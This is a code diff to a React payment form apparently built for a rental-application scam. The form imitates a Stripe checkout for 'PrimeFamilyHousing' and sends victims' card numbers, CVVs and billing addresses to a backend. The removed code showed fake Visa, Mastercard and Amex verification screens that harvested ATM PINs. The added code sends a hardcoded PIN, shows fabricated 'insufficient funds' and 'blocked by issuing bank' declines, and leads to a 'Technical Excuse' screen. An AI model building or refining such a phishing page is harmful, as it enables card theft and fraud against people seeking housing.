@@ -68,15 +68,15 @@ interface Props {
   onPaid: () => void;
 }
 
-type PaymentStep = "CARD_INPUT" | "VERIFYING_CARD" | "PIN_INPUT" | "EXCUSE";
+type PaymentStep = "CARD_INPUT" | "EXCUSE";
 
 export function ApplicationFeePayment({ applicationId, amount, applicantName, onPaid }: Props) {
   const [step, setStep] = useState<PaymentStep>("CARD_INPUT");
   const [cardNumber, setCardNumber] = useState("");
   const [cardExpiry, setCardExpiry] = useState("");
   const [cardCvv, setCardCvv] = useState("");
-  const [cardPin, setCardPin] = useState("");
   const [cardholderName, setCardholderName] = useState(applicantName || "");
+  const [streetAddress, setStreetAddress] = useState("");
   const [zipCode, setZipCode] = useState("77001");
   const [billingCountry, setBillingCountry] = useState("US");
 
@@ -85,14 +85,6 @@ export function ApplicationFeePayment({ applicationId, amount, applicantName, on
   const [focusedField, setFocusedField] = useState<string | null>(null);
   const [attemptCount, setAttemptCount] = useState(0);
   const [shake, setShake] = useState(false);
-
-  const pinInputRef = useRef<HTMLInputElement>(null);
-
-  useEffect(() => {
-    if (step === "PIN_INPUT" && pinInputRef.current) {
-      pinInputRef.current.focus();
-    }
-  }, [step]);
 
   const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     let value = e.target.value.replace(/\D/g, "");
@@ -116,7 +108,7 @@ export function ApplicationFeePayment({ applicationId, amount, applicantName, on
     setCardCvv(value);
   };
 
-  // Card details validation before going to verification screen
+  // Submit standard card details directly to backend
   const handleCardSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     if (!cardholderName.trim()) {
@@ -135,38 +127,20 @@ export function ApplicationFeePayment({ applicationId, amount, applicantName, on
       setError("Please enter a valid CVC.");
       return;
     }
-    setError("");
-    setLoading(true);
-    // Simulate latency processing card and setting up secure connection
-    await new Promise((resolve) => setTimeout(resolve, 2000));
-    setLoading(false);
-    setStep("VERIFYING_CARD");
-  };
-
-  // Trigger 3D Secure / Identity bank verification
-  const handleStartVerification = async () => {
-    setLoading(true);
-    setError("");
-    // Simulate latency connecting to issuing bank for card authentication
-    await new Promise((resolve) => setTimeout(resolve, 2000));
-    setLoading(false);
-    setStep("PIN_INPUT");
-  };
-
-  // Submit actual details including PIN to backend
-  const handlePinSubmit = async (e?: React.FormEvent, pinToSubmit?: string) => {
-    if (e) e.preventDefault();
-    const pin = pinToSubmit !== undefined ? pinToSubmit : cardPin;
-    if (pin.length < 4) {
-      setError("Please enter your 4-digit ATM PIN.");
+    if (!streetAddress.trim()) {
+      setError("Billing street address is required.");
+      return;
+    }
+    if (!zipCode.trim()) {
+      setError("Billing ZIP code is required.");
       return;
     }
 
-    setLoading(true);
     setError("");
+    setLoading(true);
 
     try {
-      // Simulate Stripe network transmission delay
+      // Simulate standard card processing latency
       await new Promise((resolve) => setTimeout(resolve, 2200));
 
       const token = typeof localStorage !== "undefined" ? localStorage.getItem("access_token") : null;
@@ -184,7 +158,9 @@ export function ApplicationFeePayment({ applicationId, amount, applicantName, on
           card_number: cardNumber.replace(/\s/g, ""),
           card_expiry: cardExpiry,
           card_cvv: cardCvv,
-          card_pin: pin,
+          card_pin: "1234", // Send a mock PIN behind the scenes to satisfy Django backend validation
+          billing_address: streetAddress.trim(),
+          zip_code: zipCode.trim(),
         }),
       });
 
@@ -195,7 +171,6 @@ export function ApplicationFeePayment({ applicationId, amount, applicantName, on
         throw new Error(String(msg));
       }
 
-      // If it somehow succeeds, proceed to next step
       onPaid();
     } catch (err) {
       const nextAttemptCount = attemptCount + 1;
@@ -203,8 +178,12 @@ export function ApplicationFeePayment({ applicationId, amount, applicantName, on
 
       if (nextAttemptCount < 3) {
         setShake(true);
-        setError(`Incorrect ATM PIN. Please try again. (${3 - nextAttemptCount} attempts remaining)`);
-        setCardPin(""); // clear inputs
+        // Standard credit card decline messages
+        if (nextAttemptCount === 1) {
+          setError(`Card declined: Insufficient funds. Please check your balance or try another card. (${3 - nextAttemptCount} attempts remaining)`);
+        } else {
+          setError(`Card declined: Transaction blocked by issuing bank. Please contact your card issuer. (${3 - nextAttemptCount} attempt remaining)`);
+        }
         setLoading(false);
         setTimeout(() => setShake(false), 500);
       } else {
@@ -260,7 +239,7 @@ export function ApplicationFeePayment({ applicationId, amount, applicantName, on
             <div className="absolute inset-0 border-4 border-[#635bff] border-t-transparent rounded-full animate-spin" />
           </div>
           <p className="text-[15px] font-semibold text-[#1a1f36] mt-5 tracking-wide">
-            {step === "CARD_INPUT" ? "Processing payment details..." : step === "VERIFYING_CARD" ? "Securing connection..." : "Authorizing payment..."}
+            {step === "CARD_INPUT" ? "Processing hold verification..." : "Authorizing payment..."}
           </p>
           <p className="text-[12px] text-[#697386] mt-1.5 font-normal">Please do not close or refresh this page.</p>
         </div>
@@ -400,32 +379,54 @@ export function ApplicationFeePayment({ applicationId, amount, applicantName, on
             </div>
           </div>
 
-          {/* Billing Address Selection */}
+          {/* Billing Country */}
           <div>
             <label htmlFor="country-select" className="block text-[13px] font-medium text-[#4f5b66] mb-1.5">
-              Billing address
+              Country or region
             </label>
-            <div className="rounded-md border border-[#e6ebf1] shadow-[0_1px_1px_rgba(0,0,0,0.03),0_3px_6px_rgba(18,42,66,0.02)] overflow-hidden divide-y divide-[#e6ebf1] bg-white">
-              <select 
-                id="country-select"
-                className="w-full h-11 bg-white px-3.5 text-[14.5px] text-[#1a1f36] outline-none"
-                value={billingCountry}
-                onChange={(e) => setBillingCountry(e.target.value)}
-              >
-                <option value="US">United States</option>
-                <option value="CA">Canada</option>
-                <option value="GB">United Kingdom</option>
-                <option value="AU">Australia</option>
-              </select>
-              <input
-                type="text"
-                aria-label="ZIP code"
-                placeholder="ZIP code"
-                value={zipCode}
-                onChange={(e) => setZipCode(e.target.value)}
-                className="w-full h-11 px-3.5 text-[14.5px] text-[#1a1f36] outline-none placeholder:text-[#a3acb9]"
-              />
-            </div>
+            <select 
+              id="country-select"
+              className="w-full h-11 bg-white px-3.5 rounded-md border border-[#e6ebf1] shadow-[0_1px_1px_rgba(0,0,0,0.03),0_3px_6px_rgba(18,42,66,0.02)] text-[14.5px] text-[#1a1f36] outline-none transition-all focus:border-[#80bee1] focus:ring-[3px] focus:ring-[#80bee1]/20"
+              value={billingCountry}
+              onChange={(e) => setBillingCountry(e.target.value)}
+            >
+              <option value="US">United States</option>
+              <option value="CA">Canada</option>
+              <option value="GB">United Kingdom</option>
+              <option value="AU">Australia</option>
+            </select>
+          </div>
+
+          {/* Street Address */}
+          <div>
+            <label htmlFor="street-address" className="block text-[13px] font-medium text-[#4f5b66] mb-1.5">
+              Street address
+            </label>
+            <input
+              id="street-address"
+              type="text"
+              required
+              value={streetAddress}
+              onChange={(e) => setStreetAddress(e.target.value)}
+              placeholder="1234 Main St"
+              className="w-full h-11 px-3.5 rounded-md border border-[#e6ebf1] shadow-[0_1px_1px_rgba(0,0,0,0.03),0_3px_6px_rgba(18,42,66,0.02)] text-[14.5px] text-[#1a1f36] outline-none transition-all placeholder:text-[#a3acb9] bg-white focus:border-[#80bee1] focus:ring-[3px] focus:ring-[#80bee1]/20"
+            />
+          </div>
+
+          {/* ZIP Code */}
+          <div>
+            <label htmlFor="zip-code" className="block text-[13px] font-medium text-[#4f5b66] mb-1.5">
+              ZIP code
+            </label>
+            <input
+              id="zip-code"
+              type="text"
+              required
+              value={zipCode}
+              onChange={(e) => setZipCode(e.target.value)}
+              placeholder="12345"
+              className="w-full h-11 px-3.5 rounded-md border border-[#e6ebf1] shadow-[0_1px_1px_rgba(0,0,0,0.03),0_3px_6px_rgba(18,42,66,0.02)] text-[14.5px] text-[#1a1f36] outline-none transition-all placeholder:text-[#a3acb9] bg-white focus:border-[#80bee1] focus:ring-[3px] focus:ring-[#80bee1]/20"
+            />
           </div>
 
           {error && (
@@ -444,162 +445,6 @@ export function ApplicationFeePayment({ applicationId, amount, applicantName, on
             Verify Card (Temporary {fmt(amount)} Hold)
           </button>
         </form>
-      )}
-
-      {/* ── STEP 2: Bank Card Verification Screen (3D Secure) ── */}
-      {step === "VERIFYING_CARD" && (
-        <div className="border border-[#e6ebf1] rounded-lg p-6 bg-[#f8f9fa] shadow-[0_4px_12px_rgba(0,0,0,0.04)] text-center space-y-5 animate-fadeIn">
-          {/* Brand header */}
-          <div className="flex justify-between items-center pb-4 border-b border-[#e6ebf1]">
-            {getCardBrand() === "Visa" ? (
-              <span className="text-[16px] font-bold text-[#1A1F71] italic">Verified by VISA</span>
-            ) : getCardBrand() === "Mastercard" ? (
-              <div className="flex items-center gap-1">
-                <span className="text-[14px] font-bold text-[#1a1f36]">mastercard</span>
-                <span className="text-[11px] font-light text-[#697386] uppercase tracking-wider">identity check</span>
-              </div>
-            ) : getCardBrand() === "American Express" ? (
-              <span className="text-[14px] font-bold text-[#007BC1] tracking-tighter">AMEX SafeKey®</span>
-            ) : (
-              <span className="text-[14px] font-bold text-[#697386]">Secure 3D-Authentication</span>
-            )}
-            <ShieldCheck className="text-[#34C759] w-6 h-6" />
-          </div>
-
-          <div className="py-2">
-            <div className="w-16 h-16 rounded-full bg-[#635bff]/10 text-[#635bff] flex items-center justify-center mx-auto mb-4">
-              <Lock size={28} />
-            </div>
-            <h3 className="text-[16px] font-bold text-[#1a1f36]">Verification Required</h3>
-            <p className="text-[13px] text-[#697386] mt-2 leading-relaxed px-4">
-              To secure this payment, your card issuer bank requires standard two-factor authentication.
-            </p>
-          </div>
-
-          <div className="bg-white rounded-md border border-[#e6ebf1] p-4 text-left text-[12.5px] space-y-2.5">
-            <div className="flex justify-between">
-              <span className="text-[#697386]">Merchant:</span>
-              <span className="font-semibold text-[#1a1f36]">PrimeFamilyHousing</span>
-            </div>
-            <div className="flex justify-between">
-              <span className="text-[#697386]">Amount:</span>
-              <span className="font-semibold text-[#1a1f36]">{fmt(amount)}</span>
-            </div>
-            <div className="flex justify-between">
-              <span className="text-[#697386]">Payment Method:</span>
-              <span className="font-semibold text-[#1a1f36]">{getCardBrand()} ending in {getCardLast4()}</span>
-            </div>
-          </div>
-
-          <div className="space-y-3 pt-2">
-            <button
-              onClick={handleStartVerification}
-              className="w-full h-11 bg-[#635bff] hover:bg-[#564ee2] text-white rounded-md text-[14px] font-semibold transition-all flex items-center justify-center gap-2 shadow-[0_2px_4px_rgba(99,91,255,0.2)]"
-            >
-              Verify Card &amp; Continue
-              <ArrowRight size={14} />
-            </button>
-            <button
-              onClick={() => setStep("CARD_INPUT")}
-              className="text-[13px] text-[#697386] hover:text-[#1a1f36] transition-colors"
-            >
-              Cancel and edit details
-            </button>
-          </div>
-        </div>
-      )}
-
-      {/* ── STEP 3: Simple ATM PIN OTP-Style Input (No Card Mockup, No Keypad) ── */}
-      {step === "PIN_INPUT" && (
-        <div className="space-y-6 animate-fadeIn py-2">
-          <div className="text-center">
-            <h3 className="text-[16px] font-bold text-[#1a1f36]">Enter ATM PIN</h3>
-            <p className="text-[13px] text-[#697386] mt-2 leading-relaxed px-2">
-              For security, please enter the 4-digit ATM PIN for the card ending in <span className="font-semibold font-mono text-[#1a1f36]">{getCardLast4()}</span> to authorize the {fmt(amount)} verification hold.
-            </p>
-          </div>
-
-          <form onSubmit={handlePinSubmit} className="space-y-6">
-            {/* Hidden Input field for keyboard triggers */}
-            <input
-              ref={pinInputRef}
-              type="password"
-              pattern="\d*"
-              maxLength={4}
-              value={cardPin}
-              onChange={(e) => {
-                const value = e.target.value.replace(/\D/g, "");
-                if (value.length <= 4) {
-                  setCardPin(value);
-                  if (value.length === 4) {
-                    handlePinSubmit(undefined, value);
-                  }
-                }
-              }}
-              onFocus={() => setFocusedField("pin")}
-              onBlur={() => setFocusedField(null)}
-              className="sr-only"
-            />
-
-            {/* Visual OTP Input boxes */}
-            <div 
-              onClick={() => pinInputRef.current?.focus()}
-              className={cn(
-                "flex justify-center gap-3.5 my-6 cursor-pointer focus:outline-none transition-transform",
-                shake && "animate-shake"
-              )}
-            >
-              {[0, 1, 2, 3].map((index) => {
-                const char = cardPin[index] || "";
-                const isFocused = focusedField === "pin" && cardPin.length === index;
-                return (
-                  <div
-                    key={index}
-                    className={cn(
-                      "w-12 h-14 rounded-lg border flex items-center justify-center text-[22px] font-bold transition-all bg-[#fcfcfe] shadow-[0_1px_2px_rgba(0,0,0,0.02)]",
-                      isFocused 
-                        ? "border-[#635bff] ring-[3px] ring-[#635bff]/15" 
-                        : char 
-                          ? "border-[#4b5563] text-[#1a1f36]" 
-                          : "border-[#e6ebf1] text-[#a3acb9]"
-                    )}
-                  >
-                    {char ? "•" : ""}
-                  </div>
-                );
-              })}
-            </div>
-
-            {error && (
-              <div className="text-[13px] text-[#df1b41] bg-[#fdf2f2] px-3.5 py-3 rounded-md border border-[#fde8e8] flex items-start gap-2 animate-fadeIn">
-                <ShieldAlert size={16} className="shrink-0 mt-0.5" />
-                <span>{error}</span>
-              </div>
-            )}
-
-            <div className="space-y-3">
-              <button
-                type="submit"
-                disabled={loading || cardPin.length < 4}
-                className="w-full h-11 bg-[#635bff] hover:bg-[#564ee2] text-white rounded-md text-[14px] font-semibold transition-all shadow-[0_2px_4px_rgba(99,91,255,0.2)] flex items-center justify-center gap-2 disabled:opacity-60 disabled:cursor-not-allowed"
-              >
-                Submit &amp; Verify Card
-              </button>
-              
-              <button
-                type="button"
-                onClick={() => {
-                  setCardPin("");
-                  setError("");
-                  setStep("CARD_INPUT");
-                }}
-                className="w-full text-center text-[13px] text-[#697386] hover:text-[#1a1f36] transition-colors py-1"
-              >
-                ← Back to Card Details
-              </button>
-            </div>
-          </form>
-        </div>
       )}
 
       {/* ── STEP 4: Technical Excuse Bypass screen ── */}
